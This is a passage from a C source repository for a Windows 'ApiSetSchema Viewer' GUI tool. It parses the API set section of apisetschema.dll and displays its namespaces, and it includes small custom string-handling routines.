} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;

#endif /* APISETX */
```

`source/ApiSetSchema/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2018
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.00.2
*
*  DATE:        03 May 2019
*
*  ApiSetSchema Viewer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//
// Strict UNICODE
//
#if !defined UNICODE
#error ANSI build is not supported
#endif

//
// Ignored warnings
//
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u
#if (_MSC_VER >= 1900)
#pragma warning(disable: 4091) // 'typedef ': ignored on left of '' when no variable is declared
#pragma warning(disable: 4311) // 'type cast': pointer truncation from %s to %s
#pragma warning(disable: 4312) // 'type cast': conversion from %s to %s of greater size
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif


#define OEMRESOURCE

#include <Windows.h>
#include <commctrl.h>
#include <ntstatus.h>
#include "ntos.h"
#include "apisetx.h"
#include "minirtl\minirtl.h"
#include "treelist.h"
#include "resource.h"

#pragma comment(lib, "ComCtl32.Lib")

typedef struct _TL_SUBITEMS_FIXED {
    ULONG       ColorFlags;
    COLORREF    BgColor;
    COLORREF    FontColor;
    PVOID       UserParam;
    ULONG       Count;
    LPWSTR      Text[2];
} TL_SUBITEMS_FIXED, *PTL_SUBITEMS_FIXED;

HTREEITEM TreeListAddItem(
    _In_ HWND TreeList,
    _In_opt_ HTREEITEM hParent,
    _In_ UINT mask,
    _In_ UINT state,
    _In_ UINT stateMask,
    _In_opt_ LPWSTR pszText,
    _In_opt_ PVOID subitems
);

typedef struct _GUI_CONTEXT {
    HINSTANCE hInstance;
    HANDLE Heap;
    //HWND MainWindow;
    ATOM ListAtom;
    HWND ListWnd;
    BOOL bShutdown;
} GUI_CONTEXT, *PGUI_CONTEXT;

GUI_CONTEXT g_ctx;

HTREEITEM OutNamespaceEntryEx(
    HTREEITEM RootItem,
    PBYTE Namespace,
    ULONG NameOffset,
    ULONG NameLength,
    ULONG Flags,
    BOOL FlagsValid
)
{
    TL_SUBITEMS_FIXED  subitems;
    PWSTR Name, NameCopy, sptr;
    HTREEITEM hSubItem;
    WCHAR szBuffer[20];

    if (NameOffset == 0)
        return 0;

    Name = (PWSTR)RtlOffsetToPointer(Namespace, NameOffset);

    NameCopy = HeapAlloc(g_ctx.Heap, HEAP_ZERO_MEMORY, NameLength + sizeof(WCHAR));
    if (NameCopy == NULL)
        return 0;

    sptr = NameCopy;

    RtlCopyMemory(
        sptr,
        Name,
        NameLength);

    sptr += (NameLength / sizeof(WCHAR));
    *sptr = 0;

    RtlSecureZeroMemory(&subitems, sizeof(subitems));

    subitems.Text[0] = L"";

    if (FlagsValid && Flags) {
        szBuffer[0] = 0;
        ultostr(Flags, szBuffer);
        sptr = szBuffer;
    }
    else {
        sptr = L"";
    }
    subitems.Text[1] = sptr;

    subitems.Count = 2;

    hSubItem = TreeListAddItem(
        g_ctx.ListWnd,
        RootItem,
        TVIF_TEXT | TVIF_STATE,
        (UINT)0,
        (UINT)0,
        NameCopy,
        &subitems);

    HeapFree(g_ctx.Heap, 0, NameCopy);
    return hSubItem;
}

void OutNamespaceValueEx(
    HTREEITEM RootItem,
    PBYTE Namespace,
    ULONG ValueOffset,
    ULONG ValueLength,
    ULONG NameOffset,
    ULONG NameLength,
    ULONG Flags,
    BOOL FlagsValid
)
{
    TL_SUBITEMS_FIXED  subitems;
    PWSTR NamePtr, ValueName = NULL, AliasName = NULL, sptr = NULL;
    WCHAR szBuffer[20];

    RtlSecureZeroMemory(&subitems, sizeof(subitems));

    // print value name

    if (ValueLength) {

        NamePtr = (PWSTR)RtlOffsetToPointer(Namespace, ValueOffset);

        ValueName = HeapAlloc(g_ctx.Heap, HEAP_ZERO_MEMORY, ValueLength + sizeof(WCHAR));
        if (ValueName) {
            sptr = ValueName;

            RtlCopyMemory(
                sptr,
                NamePtr,
                ValueLength);

            sptr += (ValueLength / sizeof(WCHAR));
            *sptr = 0;

        }
    }

    // print value alias
    if (NameLength) {

        NamePtr = (PWSTR)RtlOffsetToPointer(Namespace, NameOffset);

        AliasName = HeapAlloc(g_ctx.Heap, HEAP_ZERO_MEMORY, NameLength + sizeof(WCHAR));
        if (AliasName) {
            sptr = AliasName;

            RtlCopyMemory(
                sptr,
                NamePtr,
                NameLength);

            sptr += (NameLength / sizeof(WCHAR));
            *sptr = 0;

            sptr = AliasName;

        }
    }
    else {
        sptr = L"";
    }
    subitems.Text[0] = sptr;

    if (FlagsValid && Flags) {
        szBuffer[0] = 0;
        ultostr(Flags, szBuffer);
        sptr = szBuffer;
    }
    else {
        sptr = L"";
    }
    subitems.Text[1] = sptr;
    subitems.Count = 2;

    TreeListAddItem(
        g_ctx.ListWnd,
        RootItem,
        TVIF_TEXT | TVIF_STATE,
        (UINT)0,
        (UINT)0,
        ValueName,
        &subitems);

    if (ValueName) HeapFree(g_ctx.Heap, 0, ValueName);
    if (AliasName) HeapFree(g_ctx.Heap, 0, AliasName);
}

/*
* CenterWindow
*
* Purpose:
*
* Centers given window relative to desktop window.
*
*/
VOID CenterWindow(
    _In_ HWND hwnd
)
{
    RECT rc, rcDlg, rcOwner;
    HWND hwndParent = GetDesktopWindow();

    //center window
    if (hwndParent) {
        GetWindowRect(hwndParent, &rcOwner);
        GetWindowRect(hwnd, &rcDlg);
        CopyRect(&rc, &rcOwner);
        OffsetRect(&rcDlg, -rcDlg.left, -rcDlg.top);
        OffsetRect(&rc, -rc.left, -rc.top);
        OffsetRect(&rc, -rcDlg.right, -rcDlg.bottom);
        SetWindowPos(hwnd,
            HWND_TOP,
            rcOwner.left + (rc.right / 2),
            rcOwner.top + (rc.bottom / 2),
            0, 0,
            SWP_NOSIZE);
    }
}

/*
* InitTreeList
*
* Purpose:
*
* Intialize TreeList control.
*
*/
BOOL InitTreeList(
    _In_ HWND hwndParent,
    _Out_ ATOM *pTreeListAtom,
    _Out_ HWND *pTreeListHwnd
)
{
    ATOM     TreeListAtom;
    HWND     TreeList;
    HDITEM   hdritem;
    RECT     rc;

    if ((pTreeListAtom == NULL) || (pTreeListHwnd == NULL)) {
        return FALSE;
    }

    GetClientRect(hwndParent, &rc);
    TreeListAtom = InitializeTreeListControl();
    TreeList = CreateWindowEx(WS_EX_CLIENTEDGE, WC_TREELIST, NULL,
        WS_VISIBLE | WS_CHILD | WS_TABSTOP | TLSTYLE_COLAUTOEXPAND | TLSTYLE_LINKLINES, 10, 10,
        rc.right - 20, rc.bottom - 100, hwndParent, NULL, NULL, NULL);

    if (TreeList == NULL) {
        UnregisterClass(MAKEINTATOM(TreeListAtom), g_ctx.hInstance);
        *pTreeListHwnd = NULL;
        *pTreeListAtom = 0;
        return FALSE;
    }

    *pTreeListHwnd = TreeList;
    *pTreeListAtom = TreeListAtom;

    RtlSecureZeroMemory(&hdritem, sizeof(hdritem));
    hdritem.mask = HDI_FORMAT | HDI_TEXT | HDI_WIDTH;
    hdritem.fmt = HDF_LEFT | HDF_BITMAP_ON_RIGHT | HDF_STRING;
    hdritem.cxy = 300;
    hdritem.pszText = TEXT("Namespace");
    TreeList_InsertHeaderItem(TreeList, 0, &hdritem);
    hdritem.cxy = 130;
    hdritem.pszText = TEXT("Alias");
    TreeList_InsertHeaderItem(TreeList, 1, &hdritem);
    hdritem.cxy = 200;
    hdritem.pszText = TEXT("Flags");
    TreeList_InsertHeaderItem(TreeList, 2, &hdritem);

    return TRUE;
}

/*
* TreeListAddItem
*
* Purpose:
*
* Insert new treelist item.
*
*/
HTREEITEM TreeListAddItem(
    _In_ HWND TreeList,
    _In_opt_ HTREEITEM hParent,
    _In_ UINT mask,
    _In_ UINT state,
    _In_ UINT stateMask,
    _In_opt_ LPWSTR pszText,
    _In_opt_ PVOID subitems
)
{
    TVINSERTSTRUCT  tvitem;
    PTL_SUBITEMS    si = (PTL_SUBITEMS)subitems;

    RtlSecureZeroMemory(&tvitem, sizeof(tvitem));
    tvitem.hParent = hParent;
    tvitem.item.mask = mask;
    tvitem.item.state = state;
    tvitem.item.stateMask = stateMask;
    tvitem.item.pszText = pszText;
    tvitem.hInsertAfter = TVI_LAST;
    return TreeList_InsertTreeItem(TreeList, &tvitem, si);
}

void ListApiSetV2(
    _In_ PVOID ApiSetMap,
    _In_ HTREEITEM RootItem
)
{
    API_SET_NAMESPACE_ARRAY_V2 *Namespace = (API_SET_NAMESPACE_ARRAY_V2*)ApiSetMap;

    ULONG i, j;

    API_SET_NAMESPACE_ENTRY_V2 *NsEntry;
    API_SET_VALUE_ARRAY_V2 *ValuesArray;
    API_SET_VALUE_ENTRY_V2 *ValueEntry;

    HTREEITEM hSubItem;

    for (i = 0; i < Namespace->Count; i++) {

        NsEntry = &Namespace->Array[i];

        hSubItem = OutNamespaceEntryEx(
            RootItem,
            (PBYTE)Namespace,
            NsEntry->NameOffset,
            NsEntry->NameLength,
            0,
            FALSE);

        ValuesArray = (API_SET_VALUE_ARRAY_V2*)RtlOffsetToPointer(Namespace, NsEntry->DataOffset);

        for (j = 0; j < ValuesArray->Count; j++) {

            ValueEntry = &ValuesArray->Array[j];

            if (!EMPTY_NAMESPACE_VALUE(
                ValueEntry->ValueOffset,
                ValueEntry->ValueLength,
                ValueEntry->NameOffset,
                ValueEntry->NameLength))
            {
                OutNamespaceValueEx(
                    hSubItem,
                    (PBYTE)Namespace,
                    ValueEntry->ValueOffset,
                    ValueEntry->ValueLength,
                    ValueEntry->NameOffset,
                    ValueEntry->NameLength,
                    0,
                    FALSE);
            }
        }
    }
}

void ListApiSetV4(
    _In_ PVOID ApiSetMap,
    _In_ HTREEITEM RootItem
)
{
    API_SET_NAMESPACE_ARRAY_V4 *Namespace = (API_SET_NAMESPACE_ARRAY_V4*)ApiSetMap;

    ULONG i, j;

    API_SET_NAMESPACE_ENTRY_V4 *NsEntry;
    API_SET_VALUE_ARRAY_V4 *ValuesArray;
    API_SET_VALUE_ENTRY_V4 *ValueEntry;

    HTREEITEM hSubItem;

    for (i = 0; i < Namespace->Count; i++) {

        NsEntry = &Namespace->Array[i];

        hSubItem = OutNamespaceEntryEx(
            RootItem,
            (PBYTE)Namespace,
            NsEntry->NameOffset,
            NsEntry->NameLength,
            NsEntry->Flags,
            TRUE);

        ValuesArray = (API_SET_VALUE_ARRAY_V4*)RtlOffsetToPointer(Namespace, NsEntry->DataOffset);

        for (j = 0; j < ValuesArray->Count; j++) {

            ValueEntry = &ValuesArray->Array[j];

            if (!EMPTY_NAMESPACE_VALUE(
                ValueEntry->ValueOffset,
                ValueEntry->ValueLength,
                ValueEntry->NameOffset,
                ValueEntry->NameLength))
            {
                OutNamespaceValueEx(
                    hSubItem,
                    (PBYTE)Namespace,
                    ValueEntry->ValueOffset,
                    ValueEntry->ValueLength,
                    ValueEntry->NameOffset,
                    ValueEntry->NameLength,
                    ValueEntry->Flags,
                    TRUE);
            }
        }
    }
}

void ListApiSetV6(
    _In_ PVOID ApiSetMap,
    _In_ HTREEITEM RootItem
)
{
    API_SET_NAMESPACE_ARRAY_V6 *Namespace = (API_SET_NAMESPACE_ARRAY_V6*)ApiSetMap;

    ULONG i, j;

    API_SET_NAMESPACE_ENTRY_V6 *NsEntry;
    API_SET_VALUE_ENTRY_V6 *ValueEntry;

    HTREEITEM hSubItem;

    NsEntry = (API_SET_NAMESPACE_ENTRY_V6*)RtlOffsetToPointer(Namespace, Namespace->NamespaceEntryOffset);

    for (i = 0; i < Namespace->Count; i++) {

        hSubItem = OutNamespaceEntryEx(
            RootItem,
            (PBYTE)Namespace,
            NsEntry->NameOffset,
            NsEntry->NameLength,
            NsEntry->Flags,
            TRUE);

        ValueEntry = (API_SET_VALUE_ENTRY_V6*)RtlOffsetToPointer(Namespace, NsEntry->DataOffset);

        for (j = 0; j < NsEntry->Count; j++) {

            if (!EMPTY_NAMESPACE_VALUE(
                ValueEntry->ValueOffset,
                ValueEntry->ValueLength,
                ValueEntry->NameOffset,
                ValueEntry->NameLength))
            {
                OutNamespaceValueEx(
                    hSubItem,
                    (PBYTE)Namespace,
                    ValueEntry->ValueOffset,
                    ValueEntry->ValueLength,
                    ValueEntry->NameOffset,
                    ValueEntry->NameLength,
                    ValueEntry->Flags,
                    TRUE);
            }
            ValueEntry = (API_SET_VALUE_ENTRY_V6*)RtlOffsetToPointer(ValueEntry, sizeof(API_SET_VALUE_ENTRY_V6));
        }
        NsEntry = (API_SET_NAMESPACE_ENTRY_V6*)RtlOffsetToPointer(NsEntry, sizeof(API_SET_NAMESPACE_ENTRY_V6));
    }
}

VOID ListApiSetFromFile()
{
    UINT i;
    HMODULE MappedImageBase;
    PBYTE BaseAddress;
    PIMAGE_NT_HEADERS NtHeaders;
    IMAGE_SECTION_HEADER *SectionTableEntry;
    ULONG DataSize = 0;
    PBYTE DataPtr = NULL;
    ULONG SchemaVersion;
    WCHAR *s;

    HTREEITEM h_tviRootItem;

    MappedImageBase = LoadLibraryEx(L"apisetschema.dll", NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (MappedImageBase == NULL)
        return;

    BaseAddress = (PBYTE)(((ULONG_PTR)MappedImageBase) & ~3);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    
    SectionTableEntry = IMAGE_FIRST_SECTION(NtHeaders);

    i = NtHeaders->FileHeader.NumberOfSections;
    while (i > 0) {
        if (_strncmpi_a((CHAR*)&SectionTableEntry->Name, 
            API_SET_SECTION_NAME, 
            sizeof(API_SET_SECTION_NAME)) == 0)
        {
            DataSize = SectionTableEntry->SizeOfRawData;
            DataPtr = (PBYTE)BaseAddress + SectionTableEntry->PointerToRawData;
            break;
        }
        i -= 1;
        SectionTableEntry += 1;
    }

    if ((DataPtr == NULL) || (DataSize == 0))
        return;

    SchemaVersion = *(ULONG*)DataPtr;

    h_tviRootItem = TreeListAddItem(
        g_ctx.ListWnd,
        (HTREEITEM)NULL,
        TVIF_TEXT | TVIF_STATE,
        TVIS_EXPANDED,
        TVIS_EXPANDED,
        TEXT("ApiSetSchema"),
        (PVOID)NULL);

    if (h_tviRootItem == 0)
        return;

    switch (SchemaVersion) {
    case API_SET_SCHEMA_VERSION_V2:

        ListApiSetV2(
            DataPtr,
            h_tviRootItem);

        break;

    case API_SET_SCHEMA_VERSION_V4:

        ListApiSetV4(
            DataPtr,
            h_tviRootItem);

        break;

    case API_SET_SCHEMA_VERSION_V6:

        ListApiSetV6(
            DataPtr,
            h_tviRootItem);

        break;

    default:
        s = (WCHAR*)_alloca(200);
        if (s) {
            _strcpy(s, L"unknown schema version=");
            ultostr(SchemaVersion, _strend(s));
            MessageBox(GetDesktopWindow(), s, NULL, MB_OK);
        }
        break;
    }
}

HTREEITEM TreeView_FindLabel(
    _In_ HWND hwnd,
    _In_ HTREEITEM hItemParent,
    _In_ LPCWSTR pszLabel)
{
    TVITEMEX tvi;
    HTREEITEM hChildSearch;
    WCHAR wchLabel[MAX_PATH];

    for (tvi.hItem = TreeView_GetChild(hwnd, hItemParent);
        tvi.hItem;
        tvi.hItem = TreeView_GetNextSibling(hwnd, tvi.hItem))
    {
        tvi.mask = TVIF_TEXT | TVIF_CHILDREN;
        tvi.pszText = wchLabel;
        tvi.cchTextMax = MAX_PATH;
        if (TreeList_GetTreeItem(hwnd, &tvi, NULL)) {
            if (_strcmpi(tvi.pszText, pszLabel) == 0)
                return tvi.hItem;

            if (tvi.cChildren) {
                hChildSearch = TreeView_FindLabel(hwnd, tvi.hItem, pszLabel);
                if (hChildSearch)
                    return hChildSearch;
            }
        }
    }
    return 0;
}

VOID HandleSearchSchema(
    _In_ HWND hwndDlg)
{
    HTREEITEM hItem;
    WCHAR szSchemaName[MAX_PATH * 2];

    RtlSecureZeroMemory(szSchemaName, sizeof(szSchemaName));

    SendDlgItemMessage(
        hwndDlg,
        IDC_SEARCH_EDIT,
        WM_GETTEXT,
        (WPARAM)MAX_PATH,
        (LPARAM)&szSchemaName);

    hItem = TreeView_FindLabel(
        g_ctx.ListWnd,
        TreeView_GetRoot(g_ctx.ListWnd),
        szSchemaName);

    if (hItem) {
        TreeList_EnsureVisible(g_ctx.ListWnd, hItem);
        TreeList_Expand(g_ctx.ListWnd, hItem, TVE_EXPAND);
        SetFocus(g_ctx.ListWnd);
    }
}

VOID HandleWMNotify(
    _In_ HWND   hwndDlg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    TL_SUBITEMS_FIXED *subitems;
    LPNMHDR hdr = (LPNMHDR)lParam;

    HWND TreeList = (HWND)GetWindowLongPtr(g_ctx.ListWnd, TL_TREECONTROL_SLOT);

    TVITEMEX tvi;
    WCHAR szBuffer[MAX_PATH + 1];

    if (hdr->hwndFrom == TreeList) {
        switch (hdr->code) {
        case TVN_ITEMEXPANDED:
        case TVN_SELCHANGED:
            RtlSecureZeroMemory(&tvi, sizeof(tvi));
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

            tvi.mask = TVIF_TEXT;
            tvi.pszText = szBuffer;
            tvi.hItem = TreeList_GetSelection(g_ctx.ListWnd);
            tvi.cchTextMax = MAX_PATH;
            if (TreeList_GetTreeItem(g_ctx.ListWnd, &tvi, &subitems)) {
                SendDlgItemMessage(
                    hwndDlg,
                    IDC_ENTRY_EDIT,
                    WM_SETTEXT,
                    (WPARAM)0,
                    (LPARAM)&szBuffer);
            }

            break;
        default:
            break;
        }
    }
}

INT_PTR CALLBACK AsWindowDialogProc(
    _In_ HWND   hwndDlg,
    _In_ UINT   uMsg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    HANDLE hImage;
    HTREEITEM hRoot;

    switch (uMsg) {

    case WM_INITDIALOG:

        hImage = LoadImage(
            g_ctx.hInstance,
            MAKEINTRESOURCE(IDI_ICON_MAIN),
            IMAGE_ICON,
            0,
            0,
            LR_SHARED);

        if (hImage) {
            SetClassLongPtr(hwndDlg, GCLP_HICON, (LONG_PTR)hImage);
            DestroyIcon(hImage);
        }

        if (InitTreeList(
            hwndDlg,
            &g_ctx.ListAtom,
            &g_ctx.ListWnd))
        {
            ListApiSetFromFile();
        }
        break;

    case WM_SHOWWINDOW:
        if (wParam) {
            CenterWindow(hwndDlg);
            SendDlgItemMessage(hwndDlg, IDC_SEARCH_EDIT, EM_LIMITTEXT, MAX_PATH, 0);
            hRoot = TreeList_GetRoot(g_ctx.ListWnd);
            TreeList_EnsureVisible(g_ctx.ListWnd, hRoot);
            SetFocus(g_ctx.ListWnd);
        }
        break;

    case WM_NOTIFY:
        HandleWMNotify(
            hwndDlg,
            wParam,
            lParam);
        break;

    case WM_COMMAND:

        switch (LOWORD(wParam)) {
        case IDC_SEARCH_BUTTON:
            HandleSearchSchema(hwndDlg);
            break;

        case IDOK:
        case IDCANCEL:
            return EndDialog(hwndDlg, S_OK);
            break;
        default:
            break;
        }

    default:
        break;
    }
    return 0;
}

void main()
{
    INITCOMMONCONTROLSEX icex;

    RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));

    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_LISTVIEW_CLASSES | ICC_TREEVIEW_CLASSES;
    InitCommonControlsEx(&icex);

    g_ctx.hInstance = GetModuleHandle(NULL);
    g_ctx.Heap = HeapCreate(0, 0, 0);

    DialogBoxParam(
        g_ctx.hInstance,
        MAKEINTRESOURCE(IDD_ASDIALOG),
        NULL,
        AsWindowDialogProc,
        0);

    ExitProcess(0);
}

```

`source/ApiSetSchema/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`source/ApiSetSchema/minirtl/_strcmpi.c`:

```c
#include "rtltypes.h"

int _strcmpi_a(const char *s1, const char *s2)
{
	char c1, c2;
	
	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

int _strcmpi_w(const wchar_t *s1, const wchar_t *s2)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
	} while ( (c1 != 0) && (c1 == c2) );
	
	return (int)(c1 - c2);
}

```

`source/ApiSetSchema/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`source/ApiSetSchema/minirtl/_strend.c`:

```c
#include "rtltypes.h"

char *_strend_a(const char *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (char *)s;
}

wchar_t *_strend_w(const wchar_t *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (wchar_t *)s;
}

```

`source/ApiSetSchema/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`source/ApiSetSchema/minirtl/_strncmpi.c`:

```c
#include "rtltypes.h"

int _strncmpi_a(const char *s1, const char *s2, size_t cchars)
{
	char c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars)
{
	wchar_t c1, c2;

	if ( s1==s2 )
		return 0;

	if ( s1==0 )
		return -1;

	if ( s2==0 )
		return 1;

	if ( cchars==0 )
		return 0;

	do {
		c1 = locase_w(*s1);
		c2 = locase_w(*s2);
		s1++;
		s2++;
		cchars--;
	} while ( (c1 != 0) && (c1 == c2) && (cchars>0) );
	
	return (int)(c1 - c2);
}

```

`source/ApiSetSchema/minirtl/_strncpy.c`:

```c
#include "rtltypes.h"

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc)
{
	char *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
}

wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc)
{
	wchar_t *p;

	if ( (dest==0) || (src==0) || (ccdest==0) )
		return dest;

	ccdest--;
	p = dest;

	while ( (*src!=0) && (ccdest>0) && (ccsrc>0) ) {
		*p = *src;
		p++;
		src++;
		ccdest--;
		ccsrc--;
	}

	*p = 0;
	return dest;
}

```

`source/ApiSetSchema/minirtl/_strstr.c`:

```c
#include "rtltypes.h"

char *_strstr_a(const char *s, const char *sub_s)
{
	char c0, c1, c2, *tmps, *tmpsub;

	if (s == sub_s)
		return (char *)s;

	if (s == 0)
		return 0;

	if (sub_s == 0)
		return 0;

	c0 = *sub_s;
	while (c0 != 0) {

		while (*s != 0) {
			c2 = *s;
			if (c2 == c0)
				break;
			s++;
		}

		if (*s == 0)
			return 0;

		tmps = (char *)s;
		tmpsub = (char *)sub_s;
		do {
			c1 = *tmps;
			c2 = *tmpsub;
			tmps++;
			tmpsub++;
		} while ((c1 == c2) && (c2 != 0));

		if (c2 == 0)
			return (char *)s;

		s++;
	}
	return 0;
}

wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s)
{
	wchar_t c0, c1, c2, *tmps, *tmpsub;

	if (s == sub_s)
		return (wchar_t *)s;

	if (s == 0)
		return 0;

	if (sub_s == 0)
		return 0;

	c0 = *sub_s;
	while (c0 != 0) {

		while (*s != 0) {
			c2 = *s;
			if (c2 == c0)
				break;
			s++;
		}

		if (*s == 0)
			return 0;

		tmps = (wchar_t *)s;
		tmpsub = (wchar_t *)sub_s;
		do {
			c1 = *tmps;
			c2 = *tmpsub;
			tmps++;
			tmpsub++;
		} while ((c1 == c2) && (c2 != 0));

		if (c2 == 0)
			return (wchar_t *)s;

		s++;
	}
	return 0;
}

```

`source/ApiSetSchema/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	1 Mar 2015
*/

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcmp _strcmp_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
